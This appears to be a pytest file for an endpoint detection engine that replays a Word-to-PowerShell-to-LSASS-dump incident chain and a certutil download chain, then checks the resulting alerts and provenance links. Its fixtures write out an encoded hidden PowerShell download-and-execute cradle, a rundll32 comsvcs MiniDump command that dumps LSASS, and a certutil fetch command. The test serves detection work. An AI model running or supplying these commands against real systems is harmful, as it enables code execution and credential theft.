"""Gate B — a correlated multi-stage incident, through the wired-up engine.

The incident chain is Word -> encoded PowerShell -> rundll32 dumping LSASS:
Execution then Credential Access, three processes, one causal lineage. The
LSASS dump anchors a PROV-CAMPAIGN that joins the stages.

The certutil chain that used to be Gate B stays as a join test. It only ever
formed a campaign because DET-PROC-003 listed a technique name ("Ingress Tool
Transfer") as its tactic, which the engine counted as a second tactic. T1105 is
Command and Control, the same tactic as the egress rule, so the honest result
is two alerts and no campaign.
"""

from __future__ import annotations

import json
import sqlite3
from pathlib import Path

import manager.vendor_path  # noqa: F401
from manager import migrations
from manager.config import _DEFAULT_RULES_DIR
from manager.detection.factory import build_detection_run
from panopticon_detection.provenance.graph import EdgeKind

_CMD = "certutil -urlcache -split -f http://www.msftconnecttest.com/connecttest.txt out.txt"

_CERTUTIL_PROC = {
    "event_type": "process_create",
    "event_id": "evt_" + "c" * 61 + "001",
    "host_id": "HOST-B",
    "timestamp": "2026-08-31T12:00:00.000Z",
    "process": {
        "name": "certutil.exe",
        "pid": 7777,
        "command_line": _CMD,
        "entity_id": "proc_" + "a" * 64,
        "process_guid": "proc_" + "a" * 64,  # start-event entity id
    },
    "parent": {"name": "cmd.exe", "pid": 1000},
}

_CERTUTIL_NET = {
    "event_type": "network_connect",
    "event_id": "evt_" + "c" * 61 + "002",
    "host_id": "HOST-B",
    "timestamp": "2026-08-31T12:00:03.000Z",
    "process": {
        "name": "certutil.exe",
        "pid": 7777,
        "command_line": _CMD,
        "entity_id": "proc_" + "b" * 64,  # DIFFERENT context entity id, same pid
        "process_guid": "proc_" + "b" * 64,
    },
    "parent": {"name": "cmd.exe", "pid": 1000},
    "network": {
        "direction": "outbound",
        "protocol": "tcp",
        "destination_ip": "93.184.216.34",
        "destination_port": 80,
    },
}

_ENCODED = (
    "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"
    "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbAB3"
    "AGEAcgBlAC5zAGgAIgApAA=="
)


def _proc(n: int, second: int, name: str, pid: int, cmd: str, parent: str, ppid: int) -> dict:
    return {
        "event_type": "process_create",
        "event_id": "evt_" + "d" * 61 + f"{n:03d}",
        "host_id": "HOST-B",
        "timestamp": f"2026-08-31T13:00:{second:02d}.000Z",
        "process": {"name": name, "pid": pid, "command_line": cmd},
        "parent": {"name": parent, "pid": ppid},
    }


_WORD_CHAIN = [
    _proc(1, 0, "winword.exe", 3000, '"winword.exe" "Urgent_Invoice.docx"', "explorer.exe", 1000),
    _proc(2, 5, "powershell.exe", 4100, _ENCODED, "winword.exe", 3000),
    _proc(
        3, 30, "rundll32.exe", 4200,
        "rundll32.exe comsvcs.dll, MiniDump 620 C:\\temp\\lsass.dmp full",
        "powershell.exe", 4100,
    ),
]


def _db(path: Path) -> sqlite3.Connection:
    conn = sqlite3.connect(path)
    conn.row_factory = sqlite3.Row
    migrations.migrate(conn)
    return conn


def _replay(tmp_path: Path, events: list[dict]):
    conn = _db(tmp_path / "p.db")
    run, sink, writer, context = build_detection_run(
        conn, alerts_path=tmp_path / "alerts.ndjson", rules_dir=_DEFAULT_RULES_DIR
    )
    try:
        sink.agent_id = "officer-agent-b"
        for event in events:
            run.process_event(dict(event))
        conn.commit()
    finally:
        writer.close()
    return conn, context


def test_word_to_lsass_chain_produces_a_campaign(tmp_path: Path) -> None:
    conn, _ = _replay(tmp_path, _WORD_CHAIN)

    rule_ids = {r["rule_id"] for r in conn.execute("SELECT rule_id FROM alerts")}
    assert {"DET-PROC-001", "DET-PROC-005", "PROV-CAMPAIGN"} <= rule_ids

    corr = conn.execute("SELECT * FROM alerts WHERE rule_id = 'PROV-CAMPAIGN'").fetchone()
    assert corr["host_id"] == "HOST-B"
    # The campaign reports the technique of the detection that anchored the
    # search -- the LSASS dump -- and lists every stage in its evidence.
    assert corr["mitre_technique"] == "T1003.001"
    evidence = json.loads(corr["alert_json"])["evidence"]
    # The encoded command also trips the obfuscation rule (Defense Evasion).
    assert evidence["tactics_covered"] == ["Execution", "Defense Evasion", "Credential Access"]
    assert "DET-PROC-001" in evidence["attack_chain"]
    assert "DET-PROC-005" in evidence["attack_chain"]
    assert evidence["root_cause_process"] == "winword.exe"
    assert evidence["process_lineage"].endswith("winword.exe")


def test_certutil_chain_joins_across_entity_ids_but_is_one_tactic(tmp_path: Path) -> None:
    conn, context = _replay(tmp_path, [_CERTUTIL_PROC, _CERTUTIL_NET])

    rule_ids = {r["rule_id"] for r in conn.execute("SELECT rule_id FROM alerts")}
    assert {"DET-PROC-003", "DET-NET-006"} <= rule_ids
    assert "PROV-CAMPAIGN" not in rule_ids

    # The two events carry different entity_ids for the same process. The
    # provenance registry still joins them: the connection hangs off the very
    # node the process-create event produced.
    forked = [e for e in context.graph.edges.values() if e.kind == EdgeKind.FORKED]
    connected = [e for e in context.graph.edges.values() if e.kind == EdgeKind.CONNECTED_TO]
    assert len(forked) == 1 and len(connected) == 1
    assert connected[0].src == forked[0].dst
